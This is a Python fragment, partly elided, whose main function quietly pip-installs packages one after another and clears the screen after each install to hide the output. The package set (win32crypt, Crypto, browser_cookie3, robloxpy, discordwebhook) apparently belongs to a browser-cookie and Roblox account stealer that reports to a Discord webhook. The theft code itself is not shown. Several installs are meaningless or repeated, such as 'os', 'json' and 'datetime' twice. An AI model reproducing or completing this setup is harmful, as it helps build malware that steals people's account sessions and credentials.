...
def main():
	try:
		...
		os.system("py -m pip install Crypto")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install win32crypt")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install os")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install json")
		os.system('cls' if os.name == 'nt' else 'clear')
		...
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install robloxpy")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install browser_cookie3")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install discordwebhook")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install datetime")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install datetime")
